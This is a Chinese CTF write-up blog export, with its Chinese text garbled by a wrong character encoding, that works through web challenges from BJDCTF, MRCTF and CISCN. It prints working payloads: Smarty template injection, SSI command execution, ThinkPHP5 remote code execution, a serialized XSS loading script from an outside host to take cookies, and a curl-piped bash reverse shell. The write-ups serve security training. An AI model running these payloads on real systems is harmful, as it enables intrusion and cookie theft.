<img src="/2020/01/17/BJDCTFwp/MD53.png" class="" title="}å¼ºæ¯”è¾ƒï¼Œæ²¡æœ‰è§„å®šå­—ç¬¦ä¸²å¦‚æœè¿™ä¸ªæ—¶å€™ä¼ å…¥çš„æ˜¯æ•°ç»„ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œmd5ï¼ˆï¼‰å‡½æ•°æ— æ³•è§£å‡ºå…¶æ•°å€¼å¹¶ä¸”ä¸ä¼šæŠ¥é”™ï¼Œå°±ä¼šå¾—åˆ°æ•°å€¼ç›¸ç­‰ {%asset_img md54.png">

<p>5.Mark loves cat</p>
<p>æ‰“å¼€é¢˜ç›®åœ°å€ï¼Œæ²¡å‘ç°ä»€ä¹ˆ</p>
<p>ç”¨æ•æ„Ÿç›®å½•æ‰«æå·¥å…· syc-scan</p>
<p>python3 syc.py <a href="http://222.186.56.247:8105/" target="_blank" rel="noopener">http://222.186.56.247:8105/</a></p>
<p>å‘ç°å­˜åœ¨gitæ³„éœ²</p>
<p>ç”¨git_extract å·¥å…·è¿›è¡Œæ¢å¤</p>
<p>python git_extract.py <a href="http://222.186.56.247:8105/.git/" target="_blank" rel="noopener">http://222.186.56.247:8105/.git/</a></p>
<p>åœ¨ç›®å½•ä¸‹ç”Ÿæˆäº†ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œæ‰“å¼€æ˜¯</p>
<img src="/2020/01/17/BJDCTFwp/mark.png" class="">

<p>è¦ç»•è¿‡è¿™ä¸‰ä¸ªæ¡ä»¶æ‰èƒ½å¾—åˆ°flag</p>
<p>æ„é€ payloadï¼š?arc=flag&amp;flag=arc&amp;_GET=ntr postè¯·æ±‚:_POST[flag]=fuck</p>
<img src="/2020/01/17/BJDCTFwp/mark2.png" class="">

<ol start="6">
<li>è¿™åºåˆ—åŒ–ä¹Ÿå¤ªç®€å•äº†å§</li>
</ol>
<p>æ˜¯ä¸€é“ååºåˆ—åŒ–é¢˜</p>
<p>åœ¨ç½‘ä¸Šæ‰¾äº†å¥½å¤šåšå®¢ç ”ç©¶äº†åŠå¤©ï¼Œææ‡‚äº†ä¸€ç‚¹ä¸€ç‚¹</p>
<img src="/2020/01/17/BJDCTFwp/se1.png" class="">

<p>æŠŠä¼ å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²çš„å±æ€§ä¸ªæ•°æ›´æ”¹æˆå¤§äº 1 çš„ä»»ä½•æ•°æ¥ç»•è¿‡_wakeup()</p>
<img src="/2020/01/17/BJDCTFwp/se.png" class="">

<p>7.zjctf</p>
<p>é€šè¿‡text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=å†™å…¥é‚£å¥è¯,å†ç”¨file=php://filter/read=convert.base64-encode/resource=next.phpä»¥base64çš„æ–¹å¼è¯»å–æ–‡ä»¶ï¼Œbase64è§£å¯†å¾—åˆ°next.phpæ–‡ä»¶</p>
<img src="/2020/01/17/BJDCTFwp/zjctf1.png" class="">

<p>é€šè¿‡æµ‹è¯•/next.php?\S*=${getFlag()}&amp;cmd=system(â€œcd ../../../;lsâ€)å‘ç°æ ¹ç›®å½•ä¸‹æœ‰flag</p>
<p>æ„é€ payloadï¼š/next.php?\S*=${getFlag()}&amp;cmd=system(â€œcat /flagâ€)</p>
<img src="/2020/01/17/BJDCTFwp/zjctf.png" class="">

<p>8.The_mystery_of_ip</p>
<p>ç‚¹å‡»flagå‡ºç°äº†ipï¼ŒæŠ“åŒ…</p>
<p>çŒœæµ‹å¯èƒ½æ˜¯smartyæ¨¡æ¿æ³¨å…¥ï¼Œæ”¹ä¸€ä¸‹x-forwarded-for:{if phpindfo()}{/if}</p>
<img src="/2020/01/17/BJDCTFwp/ip1.png" class="">

<p>åº•ä¸‹æˆåŠŸæ˜¾ç¤ºäº†phpinfoçš„é¡µé¢</p>
<p>ä¿®æ”¹x-forwarded-forçš„å€¼æŸ¥è¯¢åˆ—è¡¨ï¼šX-Forwarded-For: {if system(â€˜lsâ€™)}{/if}</p>
<p>å¯ä»¥å‘ç°å‡ºç°äº†å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶</p>
<p>X-Forwarded-For: {if system(â€œcd ../../../;lsâ€)}{/if}å‘ä¸Šå±‚æ–‡ä»¶éå†ç›®å½•</p>
<img src="/2020/01/17/BJDCTFwp/ip2.png" class="">

<p>å‘ç°äº†flagæ–‡ä»¶ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¯»å–X-Forwarded-For: {if system(â€œcat /flagâ€)}{/if}</p>
<img src="/2020/01/17/BJDCTFwp/ip3.png" class="">

<p>9.easy_search</p>
<p>æ ¹æ®hintæ˜¯vimæ³„æ¼ï¼Œ<a href="http://222.186.56.247:8107/index.php.swpå¯ä»¥çœ‹åˆ°æºç ï¼Œæ ¹æ®æºç å¾—å‡ºç™»å½•å¯†ç ä¸º2020666" target="_blank" rel="noopener">http://222.186.56.247:8107/index.php.swpå¯ä»¥çœ‹åˆ°æºç ï¼Œæ ¹æ®æºç å¾—å‡ºç™»å½•å¯†ç ä¸º2020666</a></p>
<p>è´¦å·éšä¾¿è¾“ä¸€ä¸ªï¼Œå†™ä¸Šå¯†ç ï¼ŒburpæŠ“åŒ…</p>
<p>çœ‹åˆ°æœ‰ä¸€ä¸ªurl_is_here</p>
<p>çŒœæµ‹æ˜¯ssiæ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;&lt;!--#exec cmd&#x3D;&quot;ls&quot; --&gt;&amp;password&#x3D;2020666</span><br></pre></td></tr></table></figure>

<img src="/2020/01/17/BJDCTFwp/easy_search.png" class="">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;&lt;!--#exec cmd&#x3D;&quot;ls ..&#x2F;&quot; --&gt;&amp;password&#x3D;2020666</span><br></pre></td></tr></table></figure>

<img src="/2020/01/17/BJDCTFwp/easysearch2.png" class="">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;&lt;!--#execcmd&#x3D;&quot;cat..&#x2F;flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password&#x3D;2020666</span><br></pre></td></tr></table></figure>

<img src="/2020/01/17/BJDCTFwp/search3.png" class="">]]></content>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>BJD2MRCTF</title>
    <url>/2020/03/29/BJD2MRCTF/</url>
    <content><![CDATA[<h2 id="MR"><a href="#MR" class="headerlink" title="MR"></a>MR</h2><a id="more"></a>

<h4 id="0X01-å¥—å¨ƒ"><a href="#0X01-å¥—å¨ƒ" class="headerlink" title="0X01: å¥—å¨ƒ"></a>0X01: å¥—å¨ƒ</h4><p>è®¿é—®é¢˜ç›®åœ°å€ï¼Œé¡µé¢æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç ï¼Œæ‰¾åˆ°ä¿¡æ¯</p>
<img src="/2020/03/29/BJD2MRCTF/MR1.png" class="">

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">substr_count($query, <span class="string">'_'</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">'%5f'</span>) != <span class="number">0</span><span class="comment">//è¿™é‡Œç›¸å½“äºsubstr_count($query, '_') === 0 &amp;&amp; substr_count($query, '%5f') == 0</span></span><br><span class="line">è¿™é‡Œå‘å¯èƒ½æ˜¯å‡ºé¢˜äººä¸å°å¿ƒæ²¡æœ‰æ‰“ä¸Šå¯¹äº$queryä¼ å€¼çš„æ–¹å¼ï¼Œåæ¥å»ç™¾åº¦çš„æ—¶å€™å‘ç°æ˜¯æœ‰ä¸€ä¸ªå˜é‡$q_w_qç”¨_GETæ¥ä¼ å€¼çš„ï¼Œè¿™é‡Œå¯¹<span class="string">'_'</span>è¿›è¡Œäº†é™åˆ¶ï¼Œå¯ä»¥ç”¨phpçš„ç‰¹æ€§ç”¨.æ¥æ›¿ä»£</span><br><span class="line">($_GET[<span class="string">'b_u_p_t'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'b_u_p_t'</span>])<span class="comment">//è¿™é‡Œå¯ä»¥ç”¨%0aç»•è¿‡</span></span><br><span class="line"> payloadï¼š?b.u.p.t=<span class="number">23333</span>%<span class="number">0</span>a&amp;q.w.q=ls</span><br></pre></td></tr></table></figure>

<p>çˆ†å‡ºä¸‹ä¸€æ­¥è·¯å¾„</p>
<img src="/2020/03/29/BJD2MRCTF/MR2.png" class="">

<p>è®¿é—®ï¼Œæš‚æ—¶æ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ï¼Œè¿˜æ˜¯æŸ¥çœ‹æºç ï¼Œå‘ç°ä¸€æ®µjsfuckåŠ å¯†çš„å¯†æ–‡ï¼Œè§£å¯†ï¼špost me Merak</p>
<p>ç”¨burpæ¥è¿›è¡Œpostä¼ Merakï¼Œçˆ†å‡ºäº†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Flag is here~But how to get it? <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//ç›´æ¥è¯´ä¸€ä¸‹æ„é€ payloadçš„æ€è·¯</span></span><br><span class="line"><span class="number">1.</span>ip===<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>æ„é€ ä¼ªIPåœ°å€ï¼Œåˆšå¼€å§‹æƒ³åˆ°çš„æ˜¯X-Forwarded-<span class="keyword">For</span>,å‘ç°ä¸è¡Œï¼Œæƒ³åˆ°äº†ä¹‹å‰æ¯”èµ›æ”¶é›†çš„ç±»ä¼¼çš„ä¼ªæ„é€ ï¼Œclient-IPå¯ç”¨</span><br><span class="line"><span class="number">2.</span>file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> ç”¨phpä¼ªåè®®php:<span class="comment">//inputå¯ä»¥postæ•°æ®</span></span><br><span class="line"><span class="number">3.</span>change($_GET[<span class="string">'file'</span>])ï¼Œæˆ‘ä»¬æœ€åè‚¯å®šæ˜¯è¦è¯»å–flag.phpçš„ï¼Œæ ¹æ®ç»™çš„åŠ å¯†æ–¹å¼åå‘è§£å¯†ï¼Œæ¨ç®—å‡º$vä¸ºfj]a&amp;f\bï¼Œåœ¨è¿›è¡Œbase64åŠ å¯†ï¼Œè¿™é‡Œè¦æ³¨æ„è¦åœ¨æœ¬åœ°base64åŠ å¯†ï¼Œç½‘ä¸Šçš„åŠ å¯†æœ‰ç‚¹é—®é¢˜</span><br></pre></td></tr></table></figure>

<img src="/2020/03/29/BJD2MRCTF/MR3.png" class="">

<h4 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h4><p>æ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œå°è¯•è¿‡å°é©¬ä¹‹åéƒ½å¤±è´¥äº†ï¼Œä¸Šä¼ ä¸€ä¸ª.htaccessï¼ŒæˆåŠŸ</p>
<p>å†ä¸Šä¼ å°é©¬ï¼ŒæˆåŠŸ</p>
<p>ç”¨èšå‰‘è¿æ¥ï¼Œæ ¹ç›®å½•ä¸‹flag</p>
<h2 id="BJD"><a href="#BJD" class="headerlink" title="BJD"></a>BJD</h2><h4 id="0X01-old-hacker"><a href="#0X01-old-hacker" class="headerlink" title="0X01:old hacker"></a>0X01:old hacker</h4><img src="/2020/03/29/BJD2MRCTF/old1.png" class="">

<p>å¯ä»¥çœ‹åˆ°æç¤ºæ˜¯thinkphp5çš„ï¼Œç”¨expæµ‹è¯•ä¸€ä¸‹ï¼Œåˆ©ç”¨æŠ¥é”™æ”¶é›†ä¿¡æ¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;dir</span><br></pre></td></tr></table></figure>

<img src="/2020/03/29/BJD2MRCTF/old2.png" class="">

<p>æ˜¯thinkphp5.2.23ç‰ˆæœ¬çš„ï¼Œå»æ‰¾ä¸€ä¸‹æœ‰å…³ç‰ˆæœ¬çš„æ¼æ´ï¼Œæ‰¾åˆ°äº†å¯ä»¥åˆ©ç”¨çš„payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=<span class="string">'id'</span></span><br></pre></td></tr></table></figure>

<p>idæ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œå¯ä»¥ç›´æ¥è¯»å–æ ¹ç›®å½•ä¸‹çš„flag</p>
<h4 id="0X02ï¼šXSS"><a href="#0X02ï¼šXSS" class="headerlink" title="0X02ï¼šXSS"></a>0X02ï¼šXSS</h4><p>è¿™é“é¢˜ç”¨åˆ°çš„æ˜¯phpå¯ç”¨çš„ååºåˆ—åŒ–åŸç”Ÿç±»ï¼Œä»¥ä¸‹æ˜¯exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Error(<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®æ‰«ä¸€éå‘ç°æœ‰gitæ³„éœ²ï¼Œç”¨Githackæ‹¿åˆ°æºç </p>
<img src="/2020/03/29/BJD2MRCTF/xss1.png" class="">

<p>ç”¨ä¸Šé¢çš„æ–¹å¼ç”Ÿæˆåºåˆ—åŒ–æ•°æ®è¿›è¡Œæµ‹è¯•ï¼ŒæˆåŠŸå¼¹çª—</p>
<img src="/2020/03/29/BJD2MRCTF/xss2.png" class="">

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> Error(<span class="string">"&lt;script src='http://xss.fbisb.com/xss.php?do=login'&gt;alert(1)&lt;/script&gt;"</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥é€šè¿‡ä¸Šé¢çš„è¿è¡Œç»“æœä½œä¸ºpayloadæ‰“ï¼Œåœ¨cookieé‡Œå¯ä»¥æ‰¾åˆ°flag</p>
<h4 id="0X03-Duangshell"><a href="#0X03-Duangshell" class="headerlink" title="0X03:Duangshell"></a>0X03:Duangshell</h4><p>æ‰“å¼€é¢˜ç›®æœ‰æç¤ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">how can i give you source code? .swp?!</span><br></pre></td></tr></table></figure>

<p>è®¿é—®/.index.php.swpå¾—åˆ°æºç ï¼Œç”¨<code>vim -r index.php</code>æ¢å¤æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;ççˆ±ç½‘&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"how can i give you source code? .swp?!"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'girl_friend'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"where is P3rh4ps's girl friend ???"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $girl = $_POST[<span class="string">'girl_friend'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\&gt;|\\\/'</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'just girl'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>postä¸€ä¸ªgirl_friendç„¶åç»•è¿‡ä¸€äº›æ­£åˆ™æ¯”é…ä¹‹åå°±<code>exec()</code>ï¼Œ<code>exec()</code>å’Œ<code>system()</code>ä¸åŒï¼Œ<code>exec()</code>æ— å›æ˜¾ï¼Œæ‰€ä»¥è¦è€ƒè™‘åå¼¹shellï¼Œè¿™é‡Œcurlæ²¡æœ‰è¢«banæ‰</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>åœ¨webæœåŠ¡ç›®å½•ä¸‹åˆ›å»ºshell.txtæ–‡ä»¶ï¼Œipå’Œportè‡ªå·±æ”¹ä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">postæ•°æ®</span><br><span class="line">girl_friend=curl http:<span class="comment">//174.1.150.238/shell.txt|bash</span></span><br></pre></td></tr></table></figure>

<img src="/2020/03/29/BJD2MRCTF/shell.png" class="">

<p>å¯ä»¥çœ‹åˆ°åº”è¯¥æ˜¯è¦è‡ªå·±æ‰¾flagï¼Œç”¨linuxå‘½ä»¤ find/-name flagï¼ŒæˆåŠŸæ‰¾åˆ°</p>
<img src="/2020/03/29/BJD2MRCTF/shell1.png" class="">



<h4 id="0X04ï¼šezpop-çœ‹wpå¤ç°çš„"><a href="#0X04ï¼šezpop-çœ‹wpå¤ç°çš„" class="headerlink" title="0X04ï¼šezpop(çœ‹wpå¤ç°çš„)"></a>0X04ï¼šezpop(çœ‹wpå¤ç°çš„)</h4><p>æ‰“å¼€é¢˜ç›®ç½‘å€ï¼Œæ‹¿åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æ ¹æ®Y1ingå¸ˆå‚…çš„wpï¼ˆé™„ä¸Šé“¾æ¥ï¼šhttps:<span class="comment">//www.gem-love.com/ctf/2184.html#Ezpopï¼‰</span></span><br><span class="line"><span class="number">1.</span>__wakeup()æ–¹æ³•é€šè¿‡preg_match()å°†<span class="keyword">$this</span>-&gt;sourceåšå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œå¦‚æœ<span class="keyword">$this</span>-&gt;sourceæ˜¯Showç±»ï¼Œå°±è°ƒç”¨äº†__toString()æ–¹æ³•ï¼›</span><br><span class="line"><span class="number">2.</span>__toString()è®¿é—®äº†strçš„sourceå±æ€§ï¼Œstræ˜¯Testç±»ï¼Œä¸å­˜åœ¨sourceå±æ€§ï¼Œå°±è°ƒç”¨äº†Testç±»çš„__get()é­”æœ¯æ–¹æ³•ï¼›</span><br><span class="line"><span class="number">3.</span>__get()æ–¹æ³•å°†pä½œä¸ºå‡½æ•°ä½¿ç”¨ï¼Œpå®ä¾‹åŒ–ä¸ºModifyç±»ï¼Œå°±è°ƒç”¨äº†Modifierçš„__invoke()æ–¹æ³•ï¼›</span><br><span class="line"><span class="number">4.</span>__invoke()è°ƒç”¨äº†append()æ–¹æ³•ï¼ŒåŒ…å«$valueï¼Œè‹¥å°†$valueä¸ºä¼ªåè®®ï¼Œåˆ™å¯è¯»flag.phpæºç </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $var;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $source;</span><br><span class="line"><span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line">$r = <span class="keyword">new</span> Modifer();</span><br><span class="line">$s = <span class="keyword">new</span> Show();</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$t-&gt;p=$r;</span><br><span class="line">$s-&gt;str=$t;</span><br><span class="line">$s-&gt;source=$s;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($s));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>BJD2&amp;MRCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCNå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆèµ›</title>
    <url>/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€<a id="more"></a></h2><p>è¿™æ¬¡æ¯”èµ›èµ›åæ„Ÿæ…¨é¢‡å¤šï¼Œçªç„¶å‘ç°ä¹Ÿæœ‰æˆé•¿ï¼Œä¸åƒä¹‹å‰ä¸€æ ·æ²¡è¾“å‡ºäº†ï¼Œå½“æ—¶æ²¡åšå‡ºçš„ä¸€é“WEBå¤ç°å‘ç°çœŸçš„å¾ˆç®€å•ï¼Œè¿˜æ˜¯å¹³æ—¶ä¸€äº›ç®€å•çš„ç‚¹æ²¡æœ‰å¤ªè¿‡é‡è§†ï¼Œä¹Ÿæ˜¯ä¸€æ¬¡è­¦é†’ï¼Œä¸‹é¢æ¥çœ‹çœ‹é¢˜</p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>call_user_func_arrayå‡½æ•°</li>
<li>phpå¼‚å¸¸é€€å‡º</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€å®¹å™¨ï¼Œç›´æ¥ç»™æºç </p>
